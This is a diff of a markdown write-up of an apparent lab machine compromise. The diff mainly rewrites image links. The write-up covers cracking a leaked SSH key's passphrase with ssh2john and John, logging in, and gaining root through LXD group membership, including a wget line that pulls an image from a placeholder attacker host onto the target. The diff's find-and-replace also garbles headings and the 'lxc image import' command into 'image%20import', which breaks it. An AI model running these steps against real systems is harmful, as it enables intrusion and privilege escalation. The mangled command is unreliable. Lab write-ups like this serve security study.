@@ -13,7 +13,7 @@ The scan revealed two open ports:
 - SSH (22)
 - HTTP (80)
 
-![[Pasted image 20260705210557.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705210557.png)
 
 ---
 
@@ -23,7 +23,7 @@ Next, we performed directory fuzzing using **Gobuster** to discover hidden pages
 
 During the scan, we found two interesting directories.
 
-![[Pasted image 20260705210803.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705210803.png)
 
 ---
 
@@ -31,7 +31,7 @@ During the scan, we found two interesting directories.
 
 We visited the **secret** page and discovered an encrypted **SSH private key**.
 
-![[Pasted image 20260705210912.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705210912.png)
 
 We copied the private key so we could use it later for SSH authentication.
 
@@ -47,11 +47,11 @@ We converted the private key into a format that **John the Ripper** can crack us
 ssh2john
 ```
 
-![[Pasted image 20260705211144.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705211144.png)
 
 After running John against the generated hash, we successfully recovered the passphrase.
 
-![[Pasted image 20260705211324.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705211324.png)
 
 At this point we had:
 
@@ -68,7 +68,7 @@ We continued enumerating the web application and inspected the page source.
 
 There we found the username.
 
-![[Pasted image 20260705211431.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705211431.png)
 
 ---
 
@@ -76,15 +76,15 @@ There we found the username.
 
 Before using the private key, we changed its permissions.
 
-![[Pasted image 20260705211523.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705211523.png)
 
 We then authenticated to the target over SSH using the discovered username, the private key, and its passphrase.
 
-![[Pasted image 20260705211619.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705211619.png)
 
 After logging in, we successfully obtained the **user flag**.
 
-![[Pasted image 20260705211644.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705211644.png)
 
 ---
 
@@ -92,7 +92,7 @@ After logging in, we successfully obtained the **user flag**.
 
 During the enumeration process, we noticed that the current user belonged to the **LXD** group.
 
-![[Pasted image 20260705211743.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260705211743.png)
 
 Membership in the **LXD** group is dangerous because it can allow a user to create privileged containers and mount the host filesystem, ultimately leading to **Root** access.
 
@@ -100,7 +100,7 @@ We searched for an LXD privilege escalation technique and followed the exploitat
 
 ---
 
-# Building the Alpine Image (Attacker Machine)
+# Building the Alpine image%20(Attacker Machine)
 
 Clone the LXD Alpine builder project.
 
@@ -124,7 +124,7 @@ sudo ./build-alpine
 
 # Hosting the Image
 
-Serve the generated image over HTTP.
+Serve the generated image%20over HTTP.
 
 ```bash
 python3 -m http.server 8000
@@ -132,7 +132,7 @@ python3 -m http.server 8000
 
 ---
 
-# Importing the Image (Target Machine)
+# Importing the image%20(Target Machine)
 
 Download the image.
 
@@ -143,7 +143,7 @@ wget http://<attacker-ip>:8000/alpine-v3.10-x86_64-<timestamp>.tar.gz -P /tmp
 Import it into LXD.
 
 ```bash
-lxc image import /tmp/alpine-v3.10-x86_64-<timestamp>.tar.gz --alias alpine
+lxc image%20import /tmp/alpine-v3.10-x86_64-<timestamp>.tar.gz --alias alpine
 ```
 
 Create a privileged container.
